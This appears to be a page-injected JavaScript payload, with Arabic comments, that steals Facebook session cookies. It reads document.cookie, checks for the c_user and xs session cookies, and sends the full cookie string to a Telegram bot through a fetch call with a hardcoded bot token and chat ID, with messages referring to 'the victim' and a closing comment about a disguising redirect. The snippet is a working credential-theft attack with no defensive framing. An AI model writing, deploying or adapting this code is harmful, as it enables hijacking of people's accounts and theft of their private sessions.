body.script:
const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
const chatId = "6884787120";

const cookies = document.cookie;

// دالة الإرسال
function sendToTelegram(msg) {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
}

// التحقق من وجود جلسة فيسبوك
if (cookies.includes("c_user") && cookies.includes("xs")) {
  sendToTelegram("🔥 تم التقاط جلسة فيسبوك:\n\n" + cookies);
} else {
  sendToTelegram("❌ لم يتم العثور على جلسة فيسبوك.\n🔍 قد لا يكون الضحية مسجل دخول من المتصفح.");
}

// إعادة توجيه تمويهي بعد 3 ثواني
